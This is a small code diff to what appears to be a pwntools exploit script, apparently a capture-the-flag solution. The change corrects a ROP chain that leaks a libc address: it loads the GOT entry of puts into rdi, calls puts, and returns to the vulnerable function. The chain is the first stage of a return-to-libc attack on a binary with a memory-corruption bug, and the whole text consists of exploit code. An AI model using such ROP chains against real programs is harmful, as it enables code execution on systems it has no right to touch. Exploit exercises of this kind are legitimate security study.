@@ -19,7 +19,7 @@ def get_ropchain_leak():
     """Returns the ropchain for leaking a libc address (puts)."""
     ropchain = [
         context.binary.address + 0x13a3,  # pop rdi; ret;
-        context.binary.sym['puts'],
+        context.binary.got['puts'],
         context.binary.address + 0x10b0,  # call puts
         context.binary.sym['vuln']
     ]
